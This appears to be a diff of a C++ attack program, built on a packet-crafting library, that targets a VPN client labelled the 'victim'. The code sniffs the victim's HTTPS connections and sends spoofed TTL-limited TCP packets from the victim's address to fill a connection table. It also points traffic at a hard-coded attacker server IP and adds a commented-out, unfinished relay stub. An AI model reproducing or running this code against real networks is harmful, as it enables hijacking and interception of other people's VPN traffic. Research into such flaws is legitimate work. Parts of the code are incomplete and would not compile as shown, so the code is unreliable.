@@ -19,7 +19,6 @@ using std::string;
 using std::vector;
 using namespace Tins;
 
-
 string bbaddr = "149.28.240.117"; // 149.28.240.117
 
 string webdnsserver_ip;
@@ -50,7 +49,8 @@ int tcp_bind_port(unsigned short tobind) {
 	int sockfd;
 	struct sockaddr_in servaddr;
 
-	if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
+
+	if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
 		perror("socket creation failed");
 		exit(EXIT_FAILURE);
 	}
@@ -152,6 +152,8 @@ bool _sniff_website_request_handler(PDU &some_pdu) {
 	std::cout<<"FOUND: "<<ip.src_addr() <<" : "<<tcp_req.sport()<<" -> "<<ip.dst_addr()<<" : "<<tcp_req.dport()<<"\n";
 	if (ip.src_addr() == victim_ip && ip.protocol() == IPPROTO_TCP &&
 			tcp_req.dport()==https_port) {
+
+		// Attacker receives packet from victim.
 		vport = some_pdu.rfind_pdu<TCP>().sport();
 		std::cout << "Vport=" << vport << std::endl;
 		IP pkt = IP(bbaddr) / TCP(80, vport);
@@ -161,7 +163,7 @@ bool _sniff_website_request_handler(PDU &some_pdu) {
 		// tcp.set_flag(tcp_req.flags());
 
 		tcp_continue_ephem = false;
-		tcp_bind_port(vport);
+		// tcp_bind_port(vport);
 		// sender.send(pkt, iface);
 		std::cout << "HTTP Filler - client web port: " << vport << std::endl; 
 		return false;
@@ -189,7 +191,7 @@ void do_fill_table() {
         while (tcp_continue_ephem) {
 		for (short i=PORT_RANGE_START;i<PORT_RANGE_END; i++) {
                         // TCP packets placed in the ASSURED state
-                        IP pkt = IP(victim_ip, "10.8.0.6") / TCP(i, https_port); 
+                        IP pkt = IP(victim_ip, "10.8.0.10") / TCP(i, https_port); 
 			IP& ip = pkt.rfind_pdu<IP>();
 			ip.ttl(2);
                         TCP &tcp = pkt.rfind_pdu<TCP>(); 
@@ -202,6 +204,59 @@ void do_fill_table() {
 		usleep(10000000);
         }
 }
+
+
+/*
+constexpr int SOCKET_READ_BUFFER_SIZE = 1024;
+constexpr int SERVER_PORT = 8080;
+constexpr int MAX_PENDING_CONNECTIONS = 5;
+
+void *tcp_relay() {
+	/**
+	 *  
+	 * 1. Listen on port 80.
+	 * 2. Recieve traffic from the target to us on this socket
+	 * 3. Connect to target, send payload from target to client and from client to target.
+	 * l * /
+
+}
+
+void create_receive_socket() {
+	int socket_receive = socket(AF_INET, SOCK_STREAM, 0);
+	struct sockaddr_in server_addr;
+	memset(&server_addr, 0, sizeof(server_addr));
+	server_addr.sin_family = AF_INET;
+	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+	server_addr.sin_port = htons(SERVER_PORT);
+
+	bind(socket_receive, (struct sockaddr *) &server_addr, sizeof(server_addr));
+	listen(socket_receive, MAX_PENDING_CONNECTIONS);
+
+	int client_socket = accept(socket_receive, NULL, NULL);
+
+	char read_buffer[SOCKET_READ_BUFFER_SIZE];
+	memset(read_buffer, 0, SOCKET_READ_BUFFER_SIZE);
+
+	int received_bytes = recv(client_socket, read_buffer, SOCKET_READ_BUFFER_SIZE, 0);
+
+	if (received_bytes > 0) {
+		send(socket_send, read_buffer, received_bytes, 0);
+	}
+
+	close(socket_receive);
+	close(socket_send);
+	close(client_socket);
+
+return 0;
+
+}
+
+void create_send_socket() {
+    int socket_send = socket(AF_INET, SOCK_STREAM, 0);
+
+}
+*/
+
 
 int main(int argc, char** argv) {
       
@@ -222,7 +277,7 @@ int main(int argc, char** argv) {
 
 	// Need to bind to this port because the victim will send packets
 	// to the tun interface's ip address and the VPN listening port 
-	tcp_bind_port(https_port);
+	// tcp_bind_port(https_port);
 
         // Get the TCP boomerang ready	
 	thread fill_table_thread(do_fill_table);
